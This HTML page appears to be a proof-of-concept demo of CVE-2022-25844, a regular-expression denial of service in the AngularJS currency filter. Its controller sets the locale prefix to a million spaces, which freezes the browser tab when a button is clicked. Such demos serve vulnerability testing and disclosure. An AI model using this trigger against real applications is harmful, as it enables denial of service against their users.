<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CVE-2022-25844 - Unpatched Version</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
            font-size: 14px;
            margin: 20px;
            background-color: #f8f9fa;
        }

        .demo-container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }

        .version-badge {
            background-color: #dc3545;
            color: white;
            padding: 6px 12px;
            border-radius: 4px;
            font-size: 12px;
            font-weight: 600;
            margin-bottom: 16px;
            display: inline-block;
        }

        .repro-input {
            width: 100%;
            padding: 8px 12px;
            box-sizing: border-box;
            margin: 8px 0;
            border: 1px solid #ced4da;
            border-radius: 4px;
        }

        .repro-btn {
            background-color: #dc3545;
            color: white;
            padding: 8px 16px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin: 4px;
            font-size: 14px;
        }

        .repro-btn:hover {
            background-color: #c82333;
        }

        .repro-duration {
            margin-left: 16px;
            font-weight: 600;
            color: #495057;
        }

        .warning {
            background-color: #fff3cd;
            border: 1px solid #ffeaa7;
            color: #856404;
            padding: 12px;
            border-radius: 4px;
            margin: 16px 0;
        }

        label {
            display: block;
            margin: 12px 0;
        }

        label span {
            display: block;
            margin-bottom: 4px;
            font-weight: 600;
            color: #495057;
        }

        code {
            background-color: #f8f9fa;
            padding: 2px 4px;
            border-radius: 3px;
            font-family: monospace;
        }

        hr {
            margin: 20px 0;
            border: none;
            border-top: 1px solid #dee2e6;
        }

        h3 {
            margin-top: 0;
            color: #495057;
        }
    </style>
</head>

<body>
    <div class="demo-container" ng-app="vulnerableApp" ng-controller="VulnerableCtrl as $ctrl">
        <div class="version-badge">UNPATCHED - Vulnerable Version</div>

        <h3>CVE-2022-25844 - Currency Filter ReDoS (Vulnerable)</h3>

        <div class="warning">
            <strong>⚠️ WARNING:</strong> This version is vulnerable to ReDoS attacks via currency filter. The "ReDoS
            now" button will freeze the browser tab.
        </div>

        <label>
            <span>Currency symbol:</span>
            <input class="repro-input" ng-model="$ctrl.currencySymbol" ng-trim="false" />
        </label>

        <label>
            <span>Amount:</span>
            <input class="repro-input" type="number" ng-model="$ctrl.amount" ng-trim="false" />
        </label>

        <label>
            <span>Locale posPre (malicious pattern):</span>
            <input class="repro-input" ng-model="$ctrl.posPre" ng-change="$ctrl.onPosPreChange()" ng-trim="false" />
        </label>

        <hr />

        <p>
            <strong>Current Output:</strong><br />
            <code>{{ $ctrl.amount | currency : $ctrl.currencySymbol }}</code>
        </p>

        <hr />

        <button class="repro-btn" ng-click="$ctrl.triggerReDos()">
            ReDoS now (freeze tab)
        </button>

        <span class="repro-duration">{{ $ctrl.duration }}</span>
    </div>

    <script src="https://cdn.jsdelivr.net/gh/TJSTONE99/bower-angular-lts@v1.8.4/angular.min.js"></script>
    <script>
        // Vulnerable version - CVE-2022-25844 demonstration
        angular.module('vulnerableApp', [])
            .controller('VulnerableCtrl', function ($locale, $timeout) {
                var vm = this;

                vm.currencySymbol = '$';
                vm.amount = 100;
                vm.posPre = '';
                vm.duration = '(N/A)';

                // Capture initial locale state
                vm.posPre = $locale.NUMBER_FORMATS.PATTERNS[1].posPre;

                vm.onPosPreChange = function () {
                    // This is critical: mutate locale + force re-evaluation
                    $locale.NUMBER_FORMATS.PATTERNS[1].posPre = vm.posPre;

                    // Trigger digest re-run of currency filter
                    var amount = vm.amount;
                    vm.amount = 0;
                    $timeout(function () {
                        vm.amount = amount;
                    });
                };

                vm.triggerReDos = function () {
                    // EXACT exploit conditions
                    vm.currencySymbol = '';
                    vm.posPre = ' '.repeat(1000000);

                    $locale.NUMBER_FORMATS.PATTERNS[1].posPre = vm.posPre;

                    // Optional: record perceived delay (often never returns)
                    var start = performance.now();
                    $timeout(function () {
                        var end = performance.now();
                        vm.duration = ((end - start) / 1000).toFixed(2) + ' seconds';
                    });
                };
            });
    </script>
</body>

</html>